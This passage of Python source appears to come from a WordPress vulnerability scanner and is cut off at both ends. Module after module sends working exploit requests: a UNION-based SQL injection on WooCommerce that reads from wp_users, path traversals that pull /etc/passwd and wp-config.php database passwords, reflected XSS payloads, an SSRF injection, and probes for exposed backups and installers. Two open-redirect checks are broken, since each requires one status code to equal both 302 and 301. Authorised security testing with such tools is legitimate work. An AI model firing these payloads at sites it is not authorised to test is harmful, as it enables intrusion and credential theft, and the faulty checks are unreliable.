  vulnName = "wordpress-accessible-wpconfig"
  severity = "P2"
  vulnDsc = "WordPress accessible wp-config"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-config.php','/.wp-config.php.swp','/wp-config-sample.php','/wp-config.inc','/wp-config.old','/wp-config.txt','/wp-config.php.txt','/wp-config.php.bak','/wp-config.php.old','/wp-config.php.dist','/wp-config.php.inc','/wp-config.php.swp','/wp-config.php.html','/wp-config-backup.txt','/wp-config.php.save','/wp-config.php~','/wp-config.php-backup','/wp-config.php.orig','/wp-config.php.original','/_wpeprivate/config.json']
  redirAllow = False
  statusF = 200
  textF = 'DB_NAME'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'DB_PASSWORD' in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wordpress-db-backup-listing
def attMOD264(progScope):
  myKey = "da30489aa614160eb8a1f5fdca35fa00"
  vulnCat = "Disclosure"
  vulnName = "wordpress-db-backup-listing"
  severity = "P3"
  vulnDsc = "WordPress DB Backup"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/uploads/database-backups/']
  redirAllow = False
  statusF = 200
  textF = 'Index of /'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'wp-content/uploads/database-backups' in z.text and '.sql' in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wordpress-db-backup
def attMOD265(progScope):
  myKey = "1df6f313cae567159102fef4917c02c9"
  vulnCat = "Disclosure"
  vulnName = "wordpress-db-backup"
  severity = "P3"
  vulnDsc = "WordPress DB Backup"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/backup-db/']
  redirAllow = False
  statusF = 200
  textF = 'Index of /'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and '.sql">' in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wordpress-woocommerce-sqli
def attMOD266(progScope):
  myKey = "fd0ab6b267a28a76cfca776f9bfe12e1"
  vulnCat = "SQLi"
  vulnName = "wordpress-woocommerce-sqli"
  severity = "P1"
  vulnDsc = "Unauthenticated SQL injection Woocommerce"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-json/wc/store/products/collection-data?calculate_attribute_counts[0][query_type]=or&calculate_attribute_counts[0][taxonomy]=%252522%252529%252520union%252520all%252520select%2525201%25252Cconcat%252528id%25252C0x3a%25252c%252522sqli-test%252522%252529from%252520wp_users%252520where%252520%252549%252544%252520%252549%25254E%252520%2525281%252529%25253B%252500','/?rest_route=/wc/store/products/collection-data&calculate_attribute_counts[0][query_type]=or&calculate_attribute_counts[0][taxonomy]=%252522%252529%252520union%252520all%252520select%2525201%25252Cconcat%252528id%25252C0x3a%25252c%252522sqli-test%252522%252529from%252520wp_users%252520where%252520%252549%252544%252520%252549%25254E%252520%2525281%252529%25253B%252500']
  redirAllow = False
  statusF = 200
  textF = 'sqli-test'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'attribute_counts' in z.text and 'price_range' in z.text and 'term' in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wordpress-wordfence-lfi
def attMOD267(progScope):
  myKey = "8042469316aaae2876549f416198080e"
  vulnCat = "LFI"
  vulnName = "wordpress-wordfence-lfi"
  severity = "P2"
  vulnDsc = "Wordpress Plugin wordfence.7.4.5 - Local File Disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/plugins/wordfence/lib/wordfenceClass.php?file=/../../../../../../etc/passwd']
  redirAllow = False
  statusF = 200
  textF = 'root:x:0:0:'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wordpress-wordfence-waf-bypass-xss
def attMOD268(progScope):
  myKey = "1213de71515b880d64288f5c9814273f"
  vulnCat = "RXSS"
  vulnName = "wordpress-wordfence-waf-bypass-xss"
  severity = "P3"
  vulnDsc = "Wordfence WAF Bypass WordPress XSS"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/?s=ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6']
  redirAllow = False
  statusF = 200
  textF = '<script>alert(document.domain)</script>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wordpress-wordfence-xss
def attMOD269(progScope):
  myKey = "79c10357a49eb3dcdd5b084c7de7bf3c"
  vulnCat = "RXSS"
  vulnName = "wordpress-wordfence-xss"
  severity = "P3"
  vulnDsc = "WordPress Wordfence 7.4.6 Cross Site Scripting"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/plugins/wordfence/lib/diffResult.php?file=%27%3E%22%3Csvg%2Fonload=confirm%28%27test%27%29%3E']
  redirAllow = False
  statusF = 200
  textF = '\'>"<svg/onload=confirm(\'test\')>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wp-church-admin-xss
def attMOD270(progScope):
  myKey = "0972178cb7fe84c33f0acff994ecd286"
  vulnCat = "RXSS"
  vulnName = "wp-church-admin-xss"
  severity = "P3"
  vulnDsc = "WordPress Plugin church_admin - 'id' Reflected Cross-Site Scripting (XSS)"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/plugins/church-admin/includes/validate.php?id=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E']
  redirAllow = False
  statusF = 200
  textF = '</script><script>alert(document.domain)</script>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wp-config-setup
def attMOD271(progScope):
  myKey = "ea8d3976b38bf6190ddf294bae2f4db0"
  vulnCat = "Disclosure"
  vulnName = "wp-config-setup"
  severity = "P2"
  vulnDsc = "WordPress Setup Configuration"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-admin/setup-config.php?step=1']
  redirAllow = False
  statusF = 200
  textF = 'Below you should enter your database connection details.'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wp-custom-tables-xss
def attMOD272(progScope):
  myKey = "9bbcfe7d05a1d6c007c2fbdca2c11e60"
  vulnCat = "RXSS"
  vulnName = "wp-custom-tables-xss"
  severity = "P3"
  vulnDsc = "WordPress Custom Tables Plugin 3.4.4 - Reflected Cross Site Scripting (XSS)"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/plugins/custom-tables/iframe.php?s=1&key=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E']
  redirAllow = False
  statusF = 200
  textF = '</script><script>alert(document.domain)</script>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wp-finder-xss
def attMOD273(progScope):
  myKey = "3dde6793fb8e06f4bc483a8c144988ff"
  vulnCat = "RXSS"
  vulnName = "wp-finder-xss"
  severity = "P3"
  vulnDsc = "WordPress Plugin Finder - 'order' Reflected Cross-Site Scripting (XSS)"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/plugins/finder/index.php?by=type&dir=tv&order=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E']
  redirAllow = False
  statusF = 200
  textF = '</script><script>alert(document.domain)</script>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wp-flagem-xss
def attMOD274(progScope):
  myKey = "1efb263aaf29877ae1854e8ee093650b"
  vulnCat = "RXSS"
  vulnName = "wp-flagem-xss"
  severity = "P3"
  vulnDsc = "WordPress Plugin FlagEm - Reflected Cross-Site Scripting (XSS)"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/plugins/FlagEm/flagit.php?cID=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E']
  redirAllow = False
  statusF = 200
  textF = '</script><script>alert(document.domain)</script>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wp-grimag-open-redirect
def attMOD275(progScope):
  myKey = "ebe12ff8dd3ebad820cc3c8678511bff"
  vulnCat = "OpenRedirect"
  vulnName = "wp-grimag-open-redirect"
  severity = "P4"
  vulnDsc = "WordPress Grimag Themes < 1.1.1 Open Redirection"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/themes/Grimag/go.php?https://example.com']
  redirAllow = False
  statusF = 302
  textF = 'example.com'
  condition = lambda z : True if( (z.status_code == statusF and z.status_code ==301) and (textF == z.headers['Location']) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wp-gtranslate-open-redirect
def attMOD276(progScope):
  myKey = "e935443eff7c4968352dd0b3d55c569d"
  vulnCat = "OpenRedirect"
  vulnName = "wp-gtranslate-open-redirect"
  severity = "P3"
  vulnDsc = "GTranslate < 2.8.11 - Unauthenticated Open Redirect"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/plugins/gtranslate/url_addon/gtranslate.php?glang=en&gurl=/www.pluginvulnerabilities.com']
  redirAllow = False
  statusF = 302
  textF = 'www.pluginvulnerabilities.com'
  condition = lambda z : True if( (z.status_code == statusF or z.status_code == 301) and (textF == z.headers['Location']) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wp-install
def attMOD277(progScope):
  myKey = "17f33beb8d6c225b01fb929aea156c46"
  vulnCat = "RCE"
  vulnName = "wp-install"
  severity = "P1"
  vulnDsc = "WordPress Exposed Installation"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-admin/install.php']
  redirAllow = False
  statusF = 200
  textF = '<title>WordPress &rsaquo; Installation</title>'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'Site Title' in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wp-javospot-lfi
def attMOD278(progScope):
  myKey = "e74ce25331585e25fceecd893f3702bc"
  vulnCat = "Traversal"
  vulnName = "wp-javospot-lfi"
  severity = "P2"
  vulnDsc = "Javo Spot Premium Theme - Unauthenticated Directory Traversal"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-admin/admin-ajax.php?jvfrm_spot_get_json&fn=../../wp-config.php&callback=jQuery']
  redirAllow = False
  statusF = 200
  textF = 'DB_NAME'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'DB_PASSWORD' in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wp-iwp-client-listing
def attMOD279(progScope):
  myKey = "bdcf36f0a2364862e3fc3df70aba4204"
  vulnCat = "Disclosure"
  vulnName = "wp-iwp-client-listing"
  severity = "P4"
  vulnDsc = "WordPress Plugin Iwp-client Listing"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/plugins/iwp-client/']
  redirAllow = False
  statusF = 200
  textF = 'Index of'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'wp-content/plugins/iwp-client/' in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wp-knews-xss
def attMOD280(progScope):
  myKey = "da43c90a746885ae1d05176f8c8c956b"
  vulnCat = "RXSS"
  vulnName = "wp-knews-xss"
  severity = "P3"
  vulnDsc = "WordPress Plugin Knews Multilingual Newsletters - Reflected Cross-Site Scripting (XSS)"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/plugins/knews/wysiwyg/fontpicker/?ff=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E']
  redirAllow = False
  statusF = 200
  textF = '</script><script>alert(document.domain)</script>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wp-memphis-documents-library-lfi
def attMOD281(progScope):
  myKey = "3ccaeb91b4a4bafc4d4f180d91397769"
  vulnCat = "LFI"
  vulnName = "wp-memphis-documents-library-lfi"
  severity = "P2"
  vulnDsc = "WordPress Plugin Memphis Document Library 3.1.5 LFI"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/mdocs-posts/?mdocs-img-preview=../../../wp-config.php','/?mdocs-img-preview=../../../wp-config.php']
  redirAllow = False
  statusF = 200
  textF = 'DB_NAME'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'DB_PASSWORD' in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wp-multiple-theme-ssrf
def attMOD282(progScope):
  myKey = "2ef35a00750f7940b97b48a036332f74"
  vulnCat = "SSRF"
  vulnName = "wp-multiple-theme-ssrf"
  severity = "P2"
  vulnDsc = "WordPress Multiple Themes - Unauthenticated Function Injection"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
  reqMethod = "POST"
  postData = """action=epsilon_framework_ajax_action&args%5Baction%5D%5B%5D=Requests&args%5Baction%5D%5B%5D=request_multiple&args%5Bargs%5D%5B0%5D%5Burl%5D=http://example.com"""
  urlList = ['/wp-admin/admin-ajax.php?action=action_name']
  redirAllow = False
  statusF = 200
  textF = 'Example Domain'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'protocol_version' in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wp-nextgen-xss
def attMOD283(progScope):
  myKey = "b1765311fe4d758e513dee8fac116ee5"
  vulnCat = "RXSS"
  vulnName = "wp-nextgen-xss"
  severity = "P3"
  vulnDsc = "WordPress Plugin NextGEN Gallery 1.9.10 - Reflected Cross-Site Scripting (XSS)"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/plugins/nextgen-gallery/nggallery.php?test-head=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E']
  redirAllow = False
  statusF = 200
  textF = '</script><script>alert(document.domain)</script>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wp-oxygen-theme-lfi
def attMOD284(progScope):
  myKey = "e310d5a5fa61e550e64aabb8a34507c0"
  vulnCat = "LFI"
  vulnName = "wp-oxygen-theme-lfi"
  severity = "P2"
  vulnDsc = "WordPress Oxygen-Theme Themes LFI"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/themes/oxygen-theme/download.php?file=../../../wp-config.php']
  redirAllow = False
  statusF = 200
  textF = 'DB_NAME'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'DB_PASSWORD' in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wp-phpfreechat-xss
def attMOD285(progScope):
  myKey = "1cf18ad0199a36fe7da0004c5c3ac1ab"
  vulnCat = "RXSS"
  vulnName = "wp-phpfreechat-xss"
  severity = "P3"
  vulnDsc = "WordPress Plugin PHPFreeChat - 'url' Reflected Cross-Site Scripting (XSS)"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/plugins/phpfreechat/lib/csstidy-1.2/css_optimiser.php?url=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E']
  redirAllow = False
  statusF = 200
  textF = '</script><script>alert(document.domain)</script>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wp-prostore-open-redirect
def attMOD286(progScope):
  myKey = "8e64aa5d978cf02ffe5c574689127b0d"
  vulnCat = "OpenRedirect"
  vulnName = "wp-prostore-open-redirect"
  severity = "P4"
  vulnDsc = "WordPress ProStore Themes 1.1.2 Open Redirection"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/themes/prostore/go.php?https://example.com/']
  redirAllow = False
  statusF = 302
  textF = 'example.com'
  condition = lambda z : True if( (z.status_code == statusF and z.status_code == 301) and (textF == z.headers['Location']) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wp-securimage-xss
def attMOD287(progScope):
  myKey = "28744cd4d2fd122129b808e3866c05b9"
  vulnCat = "RXSS"
  vulnName = "wp-securimage-xss"
  severity = "P3"
  vulnDsc = "WordPress Plugin Securimage-WP - 'siwp_test.php' Reflected Cross-Site Scripting (XSS)"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/plugins/securimage-wp/siwp_test.php/%22/%3E%3Cscript%3Ealert(1);%3C/script%3E?tested=1']
  redirAllow = False
  statusF = 200
  textF = '<script>alert(1)</script>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wp-simple-fields-lfi
def attMOD288(progScope):
  myKey = "5409f3399491aefc705306ca9f0398fe"
  vulnCat = "LFI"
  vulnName = "wp-simple-fields-lfi"
  severity = "P2"
  vulnDsc = "WordPress Plugin Simple Fields 0.2 - 0.3.5 LFI/RFI/RCE"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/plugins/simple-fields/simple_fields.php?wp_abspath=/etc/passwd%00']
  redirAllow = False
  statusF = 200
  textF = 'root:x:0:0:'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wp-slideshow-xss
def attMOD289(progScope):
  myKey = "7928ed4a8d133390d7389f3a89cf8161"
  vulnCat = "RXSS"
  vulnName = "wp-slideshow-xss"
  severity = "P3"
  vulnDsc = "WordPress Plugin Slideshow - Reflected Cross-Site Scripting (XSS)"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPlugin/slideshow.php?randomId=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E']
  redirAllow = False
  statusF = 200
  textF = '</script><script>alert(document.domain)</script>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wp-socialfit-xss
def attMOD290(progScope):
  myKey = "3e23fa12b41bb78f476ab41ac25e3f41"
  vulnCat = "RXSS"
  vulnName = "wp-socialfit-xss"
  severity = "P3"
  vulnDsc = "WordPress Plugin SocialFit - 'msg' Cross-Site Scripting"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/plugins/socialfit/popup.php?service=googleplus&msg=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E']
  redirAllow = False
  statusF = 200
  textF = '</script><script>alert(document.domain)</script>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wordpress-super-forms
def attMOD291(progScope):
  myKey = "0d11fc9d060b9894fa19d537aaf048b4"
  vulnCat = "Listing"
  vulnName = "wordpress-super-forms"
  severity = "P4"
  vulnDsc = "WordPress super-forms Plugin Directory Listing"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/plugins/super-forms/']
  redirAllow = False
  statusF = 200
  textF = 'Index of /wp-content/plugins/super-forms/'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wp-tinymce-lfi
def attMOD292(progScope):
  myKey = "b2727dcef93e43478427ff290ccfbd55"
  vulnCat = "LFI"
  vulnName = "wp-tinymce-lfi"
  severity = "P2"
  vulnDsc = "Tinymce Thumbnail Gallery <= 1.0.7 - download-image.php LFI"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/plugins/tinymce-thumbnail-gallery/php/download-image.php?href=../../../../wp-config.php']
  redirAllow = False
  statusF = 200
  textF = 'DB_NAME'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'DB_PASSWORD' in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wp-tutor-lfi
def attMOD293(progScope):
  myKey = "fec12fc572e1d257a14bc2e1375c6b20"
  vulnCat = "LFI"
  vulnName = "wp-tutor-lfi"
  severity = "P2"
  vulnDsc = "WordPress Plugin tutor.1.5.3 - Local File Inclusion"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/plugins/tutor/views/pages/instructors.php?sub_page=/etc/passwd']
  redirAllow = False
  statusF = 200
  textF = 'root:x:0:0:'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wordpress-upload-data
def attMOD294(progScope):
  myKey = "c75ecb1b86b84130c7dc7515fbda0c40"
  vulnCat = "Disclosure"
  vulnName = "wordpress-upload-data"
  severity = "P3"
  vulnDsc = "wordpress-upload-data"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/uploads/data.txt']
  redirAllow = False
  statusF = 200
  textF = 'admin:'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'administrator:' in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wp-vault-local-file-inclusion
def attMOD295(progScope):
  myKey = "d78f87a10a38091edb76f3416d80f0b5"
  vulnCat = "LFI"
  vulnName = "wp-vault-local-file-inclusion"
  severity = "P2"
  vulnDsc = "WP Vault 0.8.6.6 – Local File Inclusion"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/?wpv-image=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd']
  redirAllow = False
  statusF = 200
  textF = 'root:x:0:0:'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wp-woocommerce-file-download
def attMOD296(progScope):
  myKey = "d6e07275e638b16b45b33e3fd03ab72f"
  vulnCat = "FileDownload"
  vulnName = "wp-woocommerce-file-download"
  severity = "P2"
  vulnDsc = "Product Input Fields for WooCommerce < 1.2.7 - Unauthenticated File Download"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-admin/admin-post.php?alg_wc_pif_download_file=../../../../../wp-config.php']
  redirAllow = False
  statusF = 200
  textF = 'DB_NAME'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'DB_PASSWORD' in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wp-woocommerce-pdf-invoice-listing
def attMOD297(progScope):
  myKey = "e9c6f4bf32e8ab9dfb36da8418a477c0"
  vulnCat = "Disclosure"
  vulnName = "wp-woocommerce-pdf-invoice-listing"
  severity = "P3"
  vulnDsc = "Woocommerce PDF Invoice Exposure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/uploads/pdf-invoices/']
  redirAllow = False
  statusF = 200
  textF = 'Index of /wp-content/uploads/pdf-invoices'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'Parent Directory' in z.text and '.pdf' in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wpdm-cache-session
def attMOD298(progScope):
  myKey = "eccbc7b2bd2cde6dab01485c53c6400d"
  vulnCat = "AccountTakeover"
  vulnName = "wpdm-cache-session"
  severity = "P3"
  vulnDsc = "Wpdm-Cache Session"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/uploads/wpdm-cache/']
  redirAllow = False
  statusF = 200
  textF = 'Index of /'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and '.txt' in z.text and 'wpdm-cache' in z.text) ) else False
  
